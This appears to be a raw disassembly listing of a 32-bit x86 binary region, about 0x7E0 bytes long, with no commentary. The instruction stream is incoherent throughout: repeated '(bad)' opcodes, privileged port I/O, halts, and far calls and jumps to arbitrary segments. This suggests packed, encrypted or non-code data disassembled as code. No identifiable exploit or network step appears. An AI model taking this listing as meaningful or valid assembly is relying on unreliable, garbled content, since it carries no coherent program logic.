  406610:	imul   dh
  406612:	push   0xc384f5d0
  406617:	pop    ebp
  406618:	es inc esp
  40661a:	mov    ch,0x1c
  40661c:	ins    DWORD PTR es:[edi],dx
  40661d:	rcl    ebx,0xd1
  406620:	mov    ch,0xdd
  406622:	je     0x4065db
  406624:	xor    DWORD PTR [eax+0x3e],ecx
  406627:	inc    eax
  406628:	stos   DWORD PTR es:[edi],eax
  406629:	test   eax,0x1529885f
  40662e:	ficom  DWORD PTR [ebp+0x7822cb20]
  406634:	mov    ds:0x7767a35d,al
  406639:	xor    al,0x3
  40663b:	ja     0x4065ee
  40663d:	xchg   DWORD PTR [ebp+eiz*1+0x68],edi
  406641:	xor    DWORD PTR [esp+edx*4-0x16e8b4cc],0x4b993cc
  40664c:	jle    0x4066ba
  40664e:	into   
  40664f:	xor    DWORD PTR [ecx-0x39],eax
  406652:	xchg   edi,eax
  406653:	sub    DWORD PTR [esi+0x14891919],edi
  406659:	pop    ss
  40665a:	xor    eax,0xe2ec392d
  40665f:	and    bh,BYTE PTR [ebx+0x345bf274]
  406665:	xlat   BYTE PTR ds:[ebx]
  406666:	sti    
  406667:	stc    
  406668:	out    dx,eax
  406669:	(bad)  
  40666a:	(bad)  
  40666c:	xchg   ebx,eax
  40666d:	adc    ebp,DWORD PTR ds:0xea52d2dc
  406673:	loop   0x406654
  406675:	ds ja  0x406696
  406678:	push   esp
  406679:	jno    0x4066c5
  40667b:	lahf   
  40667c:	push   edi
  40667d:	pop    ecx
  40667e:	inc    eax
  40667f:	(bad)  [ebp-0x7afd635d]
  406685:	xchg   edi,eax
  406686:	hlt    
  406687:	call   0x9982:0xa07eb1f0
  40668e:	cmp    DWORD PTR [ecx+eax*4],esi
  406691:	cmp    al,0xc0
  406693:	push   0xffffffec
  406695:	dec    edx
  406696:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406697:	push   edi
  406698:	out    dx,al
  406699:	sbb    edi,edx
  40669b:	add    DWORD PTR [ebp+0x7b],0x32
  40669f:	mov    esp,0xb2f6d4e6
  4066a4:	or     al,0x8a
  4066a6:	mov    dh,0xcf
  4066a8:	xlat   BYTE PTR ds:[ebx]
  4066a9:	mov    eax,0x5464873a
  4066ae:	(bad)  
  4066af:	jg     0x406707
  4066b1:	pop    eax
  4066b2:	into   
  4066b3:	inc    edi
  4066b4:	enter  0x8aa6,0xb8
  4066b8:	jge    0x406713
  4066ba:	lds    ebx,FWORD PTR [eax+0x5b]
  4066bd:	xchg   ebx,eax
  4066be:	imul   esi,DWORD PTR [edx+0xb],0xe52f64ae
  4066c5:	jae    0x40666b
  4066c7:	sbb    al,0xdc
  4066c9:	dec    esi
  4066ca:	in     eax,dx
  4066cb:	sub    DWORD PTR es:[esi],esp
  4066ce:	mov    ebx,0xc842ebf
  4066d3:	inc    ecx
  4066d4:	xchg   esi,eax
  4066d5:	pop    esp
  4066d6:	out    dx,al
  4066d7:	push   ecx
  4066d8:	push   ebp
  4066d9:	mov    ds:0x5e203408,eax
  4066de:	les    edi,FWORD PTR fs:[esi]
  4066e1:	mov    BYTE PTR [ebp+0x46fe7c23],ch
  4066e7:	xchg   ebp,eax
  4066e8:	push   0xffffffae
  4066ea:	and    al,0xd5
  4066ec:	push   0x303de670
  4066f1:	out    dx,al
  4066f2:	mov    dl,0x8a
  4066f4:	rcl    BYTE PTR [ecx],0x1f
  4066f7:	mov    al,0x53
  4066f9:	jecxz  0x4066e7
  4066fb:	push   es
  4066fc:	out    0xa9,eax
  4066fe:	out    dx,al
  4066ff:	cdq    
  406700:	xchg   DWORD PTR [esi],ecx
  406702:	int    0xdf
  406704:	xor    DWORD PTR [ebx+edx*8+0x43],edi
  406708:	sbb    BYTE PTR [esi+0x722f6a55],0xf5
  40670f:	inc    eax
  406710:	sub    DWORD PTR [eax],ebx
  406712:	in     al,dx
  406713:	adc    dh,BYTE PTR [ecx+0x126f82a8]
  406719:	dec    eax
  40671a:	inc    esi
  40671b:	dec    esp
  40671c:	jbe    0x40671c
  40671e:	push   ebp
  40671f:	dec    ebp
  406720:	movntps XMMWORD PTR [ebx],xmm5
  406723:	cmp    bh,BYTE PTR [ebp-0xd]
  406726:	dec    ebp
  406727:	popa   
  406728:	stc    
  406729:	neg    DWORD PTR [esi+0x1ccb5021]
  40672f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406730:	mov    dh,0x9c
  406732:	xor    al,0xd4
  406734:	in     eax,0x71
  406736:	ss loope 0x40671e
  406739:	and    cl,cl
  40673b:	fldcw  WORD PTR [ecx]
  40673d:	dec    ebp
  40673e:	sahf   
  40673f:	sbb    BYTE PTR [edx],bl
  406741:	xor    DWORD PTR [ecx+esi*8-0x788b77c0],esp
  406748:	shl    DWORD PTR [ecx-0xb],cl
  40674b:	out    dx,al
  40674c:	sbb    BYTE PTR [eax-0x57ac9c],dl
  406752:	fbld   TBYTE PTR [ecx+0x19058fa3]
  406758:	and    cl,BYTE PTR [ecx]
  40675a:	sub    BYTE PTR [eax-0x4],al
  40675d:	fiadd  WORD PTR ds:0x2631ae23
  406763:	sbb    BYTE PTR [edx-0x2d],0x45
  406767:	or     bh,BYTE PTR gs:[eax+0x2b]
  40676b:	push   edi
  40676c:	hlt    
  40676d:	mov    cl,0x16
  40676f:	inc    edi
  406770:	push   edi
  406771:	cld    
  406772:	fs mov ebp,0x6d5f288
  406778:	xor    dh,BYTE PTR [edi+0x2a]
  40677b:	shl    ah,cl
  40677d:	cs pop ds
  40677f:	dec    esi
  406780:	sub    BYTE PTR [ebp+0x36e976ca],dl
  406786:	mov    ebp,DWORD PTR [esi-0x56]
  406789:	sub    al,0x24
  40678b:	rol    BYTE PTR [eax-0x39],0xfc
  40678f:	inc    ecx
  406790:	and    BYTE PTR [edx],bl
  406792:	inc    ebx
  406793:	std    
  406794:	retf   0xf275
  406797:	jae    0x4067ed
  406799:	fs jmp 0x4500:0xf0d58e2b
  4067a1:	repnz or bl,bl
  4067a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4067a5:	out    0x4a,eax
  4067a7:	adc    eax,0xb6217fbe
  4067ac:	mov    ebp,0x6c402dc3
  4067b1:	nop
  4067b2:	sub    ebp,DWORD PTR [ecx-0x51]
  4067b5:	xor    al,0x95
  4067b7:	or     ebp,edx
  4067b9:	mov    bl,0x50
  4067bb:	call   0xe04e:0xa34dcdf1
  4067c2:	into   
  4067c3:	inc    esi
  4067c4:	xor    edi,DWORD PTR [ebx]
  4067c6:	fmul   QWORD PTR [edi-0x1ae6e8e0]
  4067cc:	add    edx,DWORD PTR [edi+0x5b7e9bcd]
  4067d2:	test   al,0xce
  4067d4:	xchg   ecx,eax
  4067d5:	xor    DWORD PTR [edi+eiz*2],0xffffffbf
  4067d9:	jge    0x406779
  4067db:	xchg   ah,cl
  4067dd:	mov    dl,0x5a
  4067df:	sbb    dl,BYTE PTR [ebx+eiz*1]
  4067e2:	repnz mov edi,DWORD PTR [edx+esi*8+0x16e46109]
  4067ea:	cmp    BYTE PTR [eax],al
  4067ec:	aam    0x22
  4067ee:	les    edi,FWORD PTR [edx-0x4e]
  4067f1:	push   es
  4067f2:	in     eax,0xc5
  4067f4:	inc    eax
  4067f5:	dec    ebx
  4067f6:	or     edi,DWORD PTR [ebx+0x691463c4]
  4067fc:	add    eax,0x4c080baa
  406801:	bswap  ecx
  406803:	push   es
  406804:	lahf   
  406805:	fs jb  0x4067cf
  406808:	xchg   bh,ah
  40680a:	ret    0xab6b
  40680d:	add    eax,0x33c6fb7c
  406812:	repz or eax,0x36202136
  406818:	xchg   esp,eax
  406819:	jns    0x406848
  40681b:	ret    
  40681c:	call   0x8dd5:0xde325776
  406823:	popf   
  406824:	push   edi
  406825:	fwait
  406826:	sbb    al,0xc8
  406828:	sar    ebp,0x4c
  40682b:	or     eax,0x4d99137
  406830:	lds    ecx,FWORD PTR [ebx]
  406832:	xchg   ebx,eax
  406833:	pop    ds
  406834:	inc    ecx
  406835:	imul   eax,DWORD PTR [edx],0x85bf75b9
  40683b:	xchg   ecx,eax
  40683c:	push   ebp
  40683d:	sbb    eax,0x7da22b08
  406842:	sbb    ch,BYTE PTR [eax+0x44]
  406845:	fist   WORD PTR ds:0x16344f2a
  40684b:	ds (bad) 
  40684d:	fst    QWORD PTR [esp+eiz*4+0x26246057]
  406854:	imul   ecx,DWORD PTR [ebx],0x5ba0efc
  40685a:	add    BYTE PTR [edi+0x7c],dh
  40685d:	mov    bl,0xd9
  40685f:	fbld   TBYTE PTR [edx]
  406861:	xchg   BYTE PTR [edi-0x22],bl
  406864:	repnz ins BYTE PTR es:[edi],dx
  406866:	jo     0x4068cc
  406868:	loope  0x40688d
  40686a:	pushf  
  40686b:	sbb    ah,BYTE PTR [ebx-0x22]
  40686e:	xchg   ecx,eax
  40686f:	push   ds
  406870:	popf   
  406871:	test   eax,ebx
  406873:	and    al,0xb
  406875:	sbb    BYTE PTR ds:0x931b8e50,cl
  40687b:	xchg   edx,eax
  40687c:	jl     0x40680c
  40687e:	jmp    0x4068b3
  406880:	rcr    BYTE PTR [eax],cl
  406882:	scas   al,BYTE PTR es:[edi]
  406883:	jge    0x406817
  406885:	lahf   
  406886:	adc    al,0x5c
  406888:	gs jp  0x406864
  40688b:	cmp    BYTE PTR [edx-0xc],0xed
  40688f:	pop    ecx
  406890:	int3   
  406891:	adc    BYTE PTR [ecx-0x44],cl
  406894:	sub    DWORD PTR [edi],0x7
  406897:	ds pop ebx
  406899:	sar    ecx,1
  40689b:	and    DWORD PTR [ebx+0x47],ebp
  40689e:	ins    BYTE PTR es:[edi],dx
  40689f:	push   esp
  4068a0:	test   al,0x3c
  4068a2:	mov    edi,0x5e143868
  4068a7:	imul   esp,DWORD PTR [eax+eiz*1],0xdde6adc
  4068ae:	das    
  4068af:	iret   
  4068b0:	scas   al,BYTE PTR es:[edi]
  4068b1:	test   DWORD PTR [ecx-0x5ccf763],ebx
  4068b7:	call   0x5e7d0f7
  4068bc:	pop    eax
  4068bd:	jne    0x40692a
  4068bf:	jl     0x406863
  4068c1:	pop    ss
  4068c2:	dec    edx
  4068c3:	cdq    
  4068c4:	inc    edx
  4068c5:	hlt    
  4068c6:	pop    eax
  4068c7:	out    0x21,al
  4068c9:	mov    dl,0xc4
  4068cb:	adc    dh,BYTE PTR [ebp+ebx*4-0x4a]
  4068cf:	lahf   
  4068d0:	mov    ch,0xf8
  4068d2:	push   edx
  4068d3:	sti    
  4068d4:	xchg   BYTE PTR [edx-0x38],dh
  4068d7:	repnz adc BYTE PTR [edi+ecx*8-0x34],bh
  4068dc:	jb     0x406930
  4068de:	xchg   esp,eax
  4068df:	or     eax,0x7fc6e4fd
  4068e4:	inc    edx
  4068e5:	add    edx,esp
  4068e7:	sub    eax,0x67f2b2ad
  4068ec:	mov    eax,ds:0x488e3fe2
  4068f1:	test   eax,0x81bb54de
  4068f6:	in     eax,dx
  4068f7:	pop    ebx
  4068f8:	cli    
  4068f9:	pop    esp
  4068fa:	push   0x43346c03
  4068ff:	jle    0x4068bc
  406901:	inc    ecx
  406902:	cmp    DWORD PTR [ebx*4-0x57494ab1],esp
  406909:	jge    0x4068bf
  40690b:	ss jno 0x4068f8
  40690e:	loope  0x4068c8
  406910:	push   ebx
  406911:	mov    eax,0xb75b4bd3
  406916:	cvtpi2ps xmm1,mm5
  406919:	lods   al,BYTE PTR ds:[esi]
  40691a:	mov    BYTE PTR [ecx+0x7463afc6],al
  406920:	data16 adc al,0x67
  406923:	imul   edx,DWORD PTR ss:[ebp+0x11a9699],0x5c
  40692b:	loope  0x4068cd
  40692d:	clc    
  40692e:	jmp    0xc4186142
  406933:	push   ebx
  406934:	ins    DWORD PTR es:[edi],dx
  406935:	inc    ecx
  406936:	jmp    0x4dab69aa
  40693b:	scas   eax,DWORD PTR es:[edi]
  40693c:	dec    ebp
  40693d:	or     eax,0x799c34bf
  406942:	retf   0xa36b
  406945:	sbb    al,0x7b
  406947:	repz mov ?,edx
  40694a:	pop    esp
  40694b:	and    eax,DWORD PTR [esi-0x57]
  40694e:	and    BYTE PTR [ebp-0x6a],ah
  406951:	loop   0x40692d
  406953:	aaa    
  406954:	mov    eax,0xe375a05
  406959:	sub    eax,0xadf8d909
  40695e:	add    DWORD PTR [ebp+0x4b3b109b],0x64d307e6
  406968:	clc    
  406969:	es dec esp
  40696b:	repz add al,0x88
  40696e:	(bad)  
  40696f:	push   cs
  406970:	push   ecx
  406971:	shr    DWORD PTR [ebx-0x49],0xf
  406975:	mov    cl,0xb1
  406977:	push   es
  406978:	test   al,0x7e
  40697a:	jns    0x406903
  40697c:	outs   dx,DWORD PTR ds:[esi]
  40697d:	xor    eax,0xe12b5c46
  406982:	out    0xc,eax
  406984:	jmp    0xc136:0x751bdef0
  40698b:	adc    BYTE PTR [ebx-0x543554c1],0xec
  406992:	(bad)  
  406993:	loop   0x4069e4
  406995:	and    eax,0x3fd12933
  40699a:	cs push 0x6f
  40699d:	mov    ecx,0xbab501eb
  4069a2:	add    bh,dl
  4069a4:	mov    edx,0xf4034790
  4069a9:	push   esi
  4069aa:	mov    ah,0xab
  4069ac:	dec    ecx
  4069ad:	cmovs  edx,DWORD PTR [ebx+0x3b490b09]
  4069b4:	in     al,dx
  4069b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4069b6:	retf   0xa536
  4069b9:	pop    esp
  4069ba:	mov    ebp,0x28aea914
  4069bf:	in     al,0x12
  4069c1:	pop    eax
  4069c2:	ds xchg ebx,eax
  4069c4:	add    bl,BYTE PTR [edi+0x2a]
  4069c7:	(bad)  
  4069c8:	push   ebp
  4069c9:	jmp    0x40695b
  4069cb:	ficom  WORD PTR es:[ecx-0x7e]
  4069cf:	repz pop ds
  4069d1:	pop    es
  4069d2:	popa   
  4069d3:	(bad)  
  4069d4:	push   edx
  4069d5:	push   edx
  4069d6:	sar    dh,cl
  4069d8:	nop
  4069d9:	into   
  4069da:	mov    ebx,0x568a1432
  4069df:	or     bl,dl
  4069e1:	js     0x4069a2
  4069e3:	push   eax
  4069e4:	aam    0xb4
  4069e6:	lods   al,BYTE PTR ds:[esi]
  4069e7:	and    DWORD PTR gs:[edi-0x5f],ebp
  4069eb:	cmp    ebp,DWORD PTR [esi+0x650b3fbc]
  4069f1:	push   0x17
  4069f3:	icebp  
  4069f4:	cmp    esp,DWORD PTR ds:0x64c8cf80
  4069fa:	bound  ecx,QWORD PTR [ebx+0x3b]
  4069fd:	jmp    0xd0f7f6f0
  406a02:	or     BYTE PTR [ecx+ebp*4+0x76],cl
  406a06:	outs   dx,DWORD PTR ds:[esi]
  406a07:	xchg   edx,eax
  406a08:	pop    es
  406a09:	leave  
  406a0a:	clc    
  406a0b:	into   
  406a0c:	mov    ds:0x6fa771cf,eax
  406a11:	mov    BYTE PTR [ebx+0x21e1bc4],dl
  406a17:	in     al,dx
  406a18:	out    0x6a,al
  406a1a:	out    0xff,eax
  406a1c:	sub    eax,DWORD PTR ds:0xe09e5d42
  406a22:	add    al,0xcc
  406a24:	pop    es
  406a25:	or     DWORD PTR [ecx],edx
  406a27:	out    0xca,al
  406a29:	daa    
  406a2a:	add    al,0xb6
  406a2c:	dec    eax
  406a2d:	or     ebx,edx
  406a2f:	ins    DWORD PTR es:[edi],dx
  406a30:	jp     0x4069ed
  406a32:	or     DWORD PTR [ebx-0x29],0x1b
  406a36:	inc    edi
  406a37:	test   al,0x60
  406a39:	lds    ebx,FWORD PTR ds:0x8e33c0db
  406a3f:	xchg   esp,eax
  406a40:	mov    ds:0xa0533466,al
  406a45:	mov    bh,0xc3
  406a47:	mov    eax,ds:0x2f18d253
  406a4c:	and    al,0x85
  406a4e:	mov    eax,ds:0xee409425
  406a53:	mov    dh,0xc5
  406a55:	mov    dl,0xc8
  406a57:	pop    ds
  406a58:	fwait
  406a59:	aam    0x8c
  406a5b:	add    dl,cl
  406a5d:	push   DWORD PTR [edi+0x6c]
  406a60:	mov    bh,0xd6
  406a62:	lock hlt 
  406a64:	les    esp,FWORD PTR [ecx+ecx*4+0x61f208ad]
  406a6b:	dec    esi
  406a6c:	(bad)  
  406a6d:	jbe    0x406a07
  406a6f:	aam    0x27
  406a71:	xchg   edx,eax
  406a72:	and    dl,bh
  406a74:	xlat   BYTE PTR ds:[ebx]
  406a75:	mov    dl,0x9b
  406a77:	shl    BYTE PTR [ecx-0x55284d13],1
  406a7d:	mov    eax,DWORD PTR [esp+ebx*4-0x39384f82]
  406a84:	rcl    BYTE PTR es:[ebp+0x30f71c81],0x48
  406a8c:	call   0xb242:0x8a142df
  406a93:	cs loopne 0x406afb
  406a96:	lods   eax,DWORD PTR ds:[esi]
  406a97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a98:	(bad)  
  406a99:	sbb    cl,BYTE PTR [edx+0x1bc66bb7]
  406a9f:	push   ebx
  406aa0:	loope  0x406a8a
  406aa2:	out    dx,eax
  406aa3:	and    BYTE PTR [esi+0x52],0x3f
  406aa7:	out    0x1d,eax
  406aa9:	mov    dl,BYTE PTR [eax+0x633c73bf]
  406aaf:	sti    
  406ab0:	leave  
  406ab1:	push   es
  406ab2:	test   al,0x9a
  406ab4:	add    al,0x3c
  406ab6:	call   0xaa9a:0xcfd956ad
  406abd:	loop   0x406b0e
  406abf:	xor    esi,DWORD PTR [edx]
  406ac1:	dec    ebx
  406ac2:	pop    esp
  406ac3:	gs in  al,dx
  406ac5:	out    0x17,al
  406ac7:	rcr    BYTE PTR [ebp-0x3d],1
  406aca:	fs jle 0x406aa9
  406acd:	add    BYTE PTR [edi+0xa1ad2e3],al
  406ad3:	or     edi,ebx
  406ad5:	call   0x36a4:0x42d5546b
  406adc:	imul   edx,DWORD PTR [ebx-0x525a05f9],0xa52b441b
  406ae6:	dec    edi
  406ae7:	mov    edi,0xffc77e7c
  406aec:	scas   eax,DWORD PTR es:[edi]
  406aed:	por    mm5,QWORD PTR [ecx+0x5d]
  406af1:	cs inc ebp
  406af3:	mov    eax,ds:0xb63239ef
  406af8:	xchg   ebp,eax
  406af9:	and    ebx,DWORD PTR [ecx-0x382b62fd]
  406aff:	mov    ds:0x524837d0,al
  406b04:	sbb    DWORD PTR [esi-0x44],ecx
  406b07:	cmp    ebx,DWORD PTR ds:0xfded4cfa
  406b0d:	leave  
  406b0e:	hlt    
  406b0f:	pushf  
  406b10:	mov    bl,0x13
  406b12:	lods   eax,DWORD PTR ds:[esi]
  406b13:	repz mov eax,0xf20a275f
  406b19:	mov    ds:0xd5359f4a,al
  406b1e:	imul   eax,DWORD PTR [esi+0x3b],0x71
  406b22:	sti    
  406b23:	mov    cl,0xf1
  406b25:	sbb    BYTE PTR [edi-0x3a],0xde
  406b29:	test   ch,bh
  406b2b:	(bad)  
  406b2c:	push   0xbfc7084d
  406b31:	lods   al,BYTE PTR ds:[esi]
  406b32:	and    BYTE PTR ss:[ebp-0x2af41ff7],dl
  406b39:	inc    esi
  406b3a:	add    BYTE PTR [ebp-0x57a98f12],dh
  406b40:	dec    edx
  406b41:	add    esp,DWORD PTR [eax+0x2b]
  406b44:	aam    0xa5
  406b46:	sub    dh,al
  406b48:	ins    BYTE PTR es:[edi],dx
  406b49:	cmc    
  406b4a:	(bad)  
  406b4b:	test   DWORD PTR [edx+0x5f],0x3e489f06
  406b52:	repz arpl WORD PTR [edi],si
  406b55:	xchg   ecx,eax
  406b56:	add    al,0x1
  406b58:	ret    0xd140
  406b5b:	xchg   edi,eax
  406b5c:	(bad)  
  406b5d:	sbb    DWORD PTR [ebx-0x3b],edi
  406b60:	inc    edi
  406b61:	mov    dh,0xee
  406b63:	xor    ecx,ecx
  406b65:	add    DWORD PTR [edx],edx
  406b67:	push   ebx
  406b68:	in     al,dx
  406b69:	pop    esp
  406b6a:	imul   ebx,ebp,0x22
  406b6d:	jmp    0xc302:0xd5e9b127
  406b74:	xor    eax,0x4ed552e0
  406b79:	mov    dl,0xcb
  406b7b:	add    BYTE PTR [ecx],bl
  406b7d:	sbb    dl,BYTE PTR [ebx-0x1fb63220]
  406b83:	popa   
  406b84:	push   cs
  406b85:	in     al,0x70
  406b87:	mov    ah,bl
  406b89:	and    eax,0x64d41385
  406b8e:	mov    dl,0x25
  406b90:	jbe    0x406b7c
  406b92:	into   
  406b93:	push   ebx
  406b94:	pop    edi
  406b95:	scas   al,BYTE PTR es:[edi]
  406b96:	cld    
  406b97:	mov    ebx,0xbc99ade3
  406b9c:	and    al,0xb
  406b9e:	es push edi
  406ba0:	mov    ebx,0xc9e48f03
  406ba5:	inc    edi
  406ba6:	pop    ebx
  406ba7:	xchg   ebp,eax
  406ba8:	jge    0x406ba4
  406baa:	push   esi
  406bab:	repnz shr BYTE PTR [ebp+0x1f],0x17
  406bb0:	push   edi
  406bb1:	pop    ebx
  406bb2:	sub    dh,BYTE PTR [eax-0xf]
  406bb5:	inc    esp
  406bb6:	fcomp  QWORD PTR ds:0xbab7c41a
  406bbc:	sub    eax,0x96d55418
  406bc1:	xor    esi,DWORD PTR [ebx]
  406bc3:	mov    eax,0x753370e2
  406bc8:	test   BYTE PTR [eax],dh
  406bca:	sahf   
  406bcb:	dec    ebp
  406bcc:	(bad)  
  406bcd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406bce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406bcf:	sub    dl,dh
  406bd1:	sub    DWORD PTR [edx-0x76],esi
  406bd4:	xor    eax,0x5b4ade87
  406bd9:	addr16 jl 0x406bac
  406bdc:	dec    ebp
  406bdd:	add    al,0x8d
  406bdf:	imul   ecx,DWORD PTR [ebx+0x7],0x6d
  406be3:	test   bh,dl
  406be5:	or     eax,0x3bcd40e7
  406bea:	into   
  406beb:	in     al,0xdf
  406bed:	cmp    dl,BYTE PTR [ebx-0x5f]
  406bf0:	jmp    0xd190:0xdf4549d3
  406bf7:	add    eax,ebx
  406bf9:	pop    ebx
  406bfa:	mov    edi,0x33a0cce3
  406bff:	xchg   ecx,eax
  406c00:	cdq    
  406c01:	jmp    0x406bcf
  406c03:	test   BYTE PTR [ebp-0x7471c6ce],0x34
  406c0a:	and    eax,0x303deb01
  406c0f:	xor    al,0xf3
  406c11:	xor    esp,esp
  406c13:	outs   dx,BYTE PTR ds:[esi]
  406c14:	in     al,0xbe
  406c16:	sbb    dl,BYTE PTR [eax-0x6d367db7]
  406c1c:	retf   0xce69
  406c1f:	cmp    al,BYTE PTR [ebx]
  406c21:	cmc    
  406c22:	cdq    
  406c23:	and    eax,0xdaaa2a6f
  406c28:	adc    di,WORD PTR cs:[esi+0x5e9964d5]
  406c30:	(bad)  [edi]
  406c32:	inc    BYTE PTR [ecx]
  406c34:	add    eax,0x788f8a82
  406c39:	adc    BYTE PTR [ebp+0x50],0x9a
  406c3d:	enter  0x578,0xc
  406c41:	sub    DWORD PTR [edi],edx
  406c43:	stc    
  406c44:	pushf  
  406c45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c46:	add    DWORD PTR [esi+0x2570ac6f],esi
  406c4c:	lods   eax,DWORD PTR ds:[esi]
  406c4d:	adc    ah,ch
  406c4f:	imul   eax,DWORD PTR es:[edi-0x48883f53],0x5a28474a
  406c5a:	push   ds
  406c5b:	imul   ebp,DWORD PTR [ebp-0x37],0x28
  406c5f:	gs inc edi
  406c61:	test   al,0x44
  406c63:	add    dl,BYTE PTR [esi+0x24]
  406c66:	in     al,dx
  406c67:	mov    ds:0xca0af8da,al
  406c6c:	inc    esi
  406c6d:	fstp   QWORD PTR [edx-0x6753ac6b]
  406c73:	mov    cl,0x75
  406c75:	ret    
  406c76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c77:	stos   BYTE PTR es:[edi],al
  406c78:	cmp    eax,0x7b24e35
  406c7d:	cdq    
  406c7e:	push   esp
  406c7f:	jnp    0x406c47
  406c81:	ror    BYTE PTR [eax],1
  406c83:	mov    al,0xf7
  406c85:	inc    eax
  406c86:	cld    
  406c87:	fwait
  406c88:	inc    edx
  406c89:	add    BYTE PTR [edx],0xed
  406c8c:	aad    0x36
  406c8e:	ss (bad) 
  406c90:	bound  eax,QWORD PTR [ecx]
  406c92:	data16 ja 0x406c6f
  406c95:	retf   0x1222
  406c98:	shr    BYTE PTR [esi+0x57],0xf4
  406c9c:	scas   eax,DWORD PTR es:[edi]
  406c9d:	in     al,0x21
  406c9f:	stos   DWORD PTR es:[edi],eax
  406ca0:	daa    
  406ca1:	ins    BYTE PTR es:[edi],dx
  406ca2:	ss ss jecxz 0x406c3d
  406ca6:	mov    esp,0xa303629
  406cab:	push   eax
  406cac:	aaa    
  406cad:	pop    esp
  406cae:	add    bl,bl
  406cb0:	xchg   ebx,eax
  406cb1:	xchg   ecx,eax
  406cb2:	out    0x70,eax
  406cb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406cb5:	mov    ah,0x37
  406cb7:	push   ebx
  406cb8:	test   eax,0x6a7f1c47
  406cbd:	pop    es
  406cbe:	aam    0x20
  406cc0:	xchg   ecx,eax
  406cc1:	(bad)  
  406cc2:	ins    DWORD PTR es:[edi],dx
  406cc3:	leave  
  406cc4:	dec    esi
  406cc5:	ins    BYTE PTR es:[edi],dx
  406cc6:	or     BYTE PTR [ecx-0x464adc62],ah
  406ccc:	xlat   BYTE PTR ds:[ebx]
  406ccd:	and    BYTE PTR [edi-0x1bd1d22a],0x6f
  406cd4:	scas   al,BYTE PTR es:[edi]
  406cd5:	pop    ebp
  406cd6:	ror    DWORD PTR [ebx-0xb],0x20
  406cda:	lds    esi,FWORD PTR [ebx+0x607ac668]
  406ce0:	mov    ds:0xd6b05feb,eax
  406ce5:	pop    eax
  406ce6:	es ins DWORD PTR es:[edi],dx
  406ce8:	mov    DWORD PTR [ebp-0x63],eax
  406ceb:	ret    0xf943
  406cee:	pop    esp
  406cef:	mov    bh,0x3d
  406cf1:	xchg   ebx,ebp
  406cf3:	xor    al,0x3d
  406cf5:	pop    ebx
  406cf6:	rol    DWORD PTR [edx-0x6b14f545],cl
  406cfc:	jns    0x406d24
  406cfe:	into   
  406cff:	stc    
  406d00:	loope  0x406ce4
  406d02:	in     eax,dx
  406d03:	sub    al,0x82
  406d05:	std    
  406d06:	lock idiv DWORD PTR [esi-0x4f]
  406d0a:	cmp    eax,0xed85f2ed
  406d0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d10:	add    BYTE PTR [esi],ch
  406d12:	sbb    ebp,ecx
  406d14:	cmp    al,0xde
  406d16:	ins    BYTE PTR es:[edi],dx
  406d17:	jmp    0x406d60
  406d19:	mov    ecx,0xe67b88e3
  406d1e:	loop   0x406d79
  406d20:	jmp    0x406d14
  406d22:	mov    edi,0x162dd5e0
  406d27:	out    dx,eax
  406d28:	gs call 0x9e2f74a8
  406d2e:	mov    eax,ds:0x7c15784e
  406d33:	push   esp
  406d34:	dec    edi
  406d35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d36:	mov    ah,0xe0
  406d38:	mov    ch,0x35
  406d3a:	push   ss
  406d3b:	scas   eax,DWORD PTR es:[edi]
  406d3c:	retf   0x54ba
  406d3f:	not    edx
  406d41:	jbe    0x406d1a
  406d43:	dec    eax
  406d44:	xchg   ebx,eax
  406d45:	retf   
  406d46:	out    dx,al
  406d47:	fmulp  st(6),st
  406d49:	rol    DWORD PTR [edx+0x57],1
  406d4c:	add    DWORD PTR [edi],esi
  406d4e:	push   ebx
  406d4f:	jle    0x406d55
  406d51:	fmul   DWORD PTR [ecx]
  406d53:	test   eax,0xc2167a2
  406d58:	lock sbb eax,0xe5232bfa
  406d5e:	ffreep st(2)
  406d60:	std    
  406d61:	aaa    
  406d62:	sbb    DWORD PTR [edx-0x4a0ec328],ecx
  406d68:	es push eax
  406d6a:	shl    DWORD PTR gs:[edx],cl
  406d6d:	stos   BYTE PTR es:[edi],al
  406d6e:	or     eax,0x92e55046
  406d73:	sti    
  406d74:	cmc    
  406d75:	sahf   
  406d76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d77:	aaa    
  406d78:	push   esi
  406d79:	push   ss
  406d7a:	test   BYTE PTR [edx-0x28f9169a],0xf
  406d81:	mov    bl,0x74
  406d83:	(bad)  
  406d84:	jle    0x406d70
  406d86:	rcr    BYTE PTR [edi],0x89
  406d89:	pop    eax
  406d8a:	mov    dl,0x4
  406d8c:	outs   dx,BYTE PTR ds:[esi]
  406d8d:	dec    ebp
  406d8e:	mov    DWORD PTR [eax+0x7e938d6a],ecx
  406d94:	retf   
  406d95:	mov    esi,0x14ed9ca7
  406d9a:	call   0xd61a:0x350d7dce
  406da1:	xchg   esp,eax
  406da2:	adc    edx,ebx
  406da4:	stos   BYTE PTR es:[edi],al
  406da5:	and    ebx,DWORD PTR [eax+0x5c00b9c8]
  406dab:	hlt    
  406dac:	test   eax,0x921db24c
  406db1:	enter  0x9f66,0xf7
  406db5:	mov    ecx,0x5a3a0b7d
  406dba:	ret    
  406dbb:	sbb    esi,DWORD PTR [edi-0x55875244]
  406dc1:	adc    esi,DWORD PTR [ecx]
  406dc3:	jae    0x406dbb
  406dc5:	mov    esp,0x35984668
  406dca:	rcr    bh,cl
  406dcc:	xchg   edx,eax
  406dcd:	retf   
  406dce:	fcmove st,st(7)
  406dd0:	clc    
  406dd1:	addr16 (bad) 
  406dd3:	adc    ebp,edi
  406dd5:	mov    al,ds:0x69b0bee9
  406dda:	mov    eax,ds:0x8c64781b
  406ddf:	jge    0x406d8a
  406de1:	push   cs
  406de2:	lea    esi,[esi+esi*2]
  406de5:	cmp    esp,esi
  406de7:	cs imul dh
  406dea:	xor    al,0x1d
  406dec:	xchg   ebx,eax
